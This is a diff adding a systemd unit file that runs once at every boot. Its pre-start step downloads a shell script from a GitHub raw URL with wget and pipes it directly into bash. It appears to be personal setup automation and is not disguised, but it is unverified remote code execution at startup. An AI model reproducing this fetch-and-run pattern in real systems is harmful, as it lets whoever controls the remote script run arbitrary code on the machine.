@@ -1,0 +1,13 @@
+#UNIT, INSTALL, AND SERVICE MAIN
+[Unit]
+After=multi-user.target
+[Install]
+WantedBy=multi-user.target
+[Service]
+Type=oneshot
+TimeoutStartSec=600
+RemainAfterExit=true
+#MAIN LOGIC
+ExecStartPre=/bin/bash -c "clear;export URLRAW=https://raw.githubusercontent.com;if dig +short $URLRAW;then wget -q -O - $URLRAW/j1nh0/linx/main/buildme.sh|bash -s -- rcl;fi"
+#MAIN EXIT
+ExecStart=/bin/bash -c "exit 0"
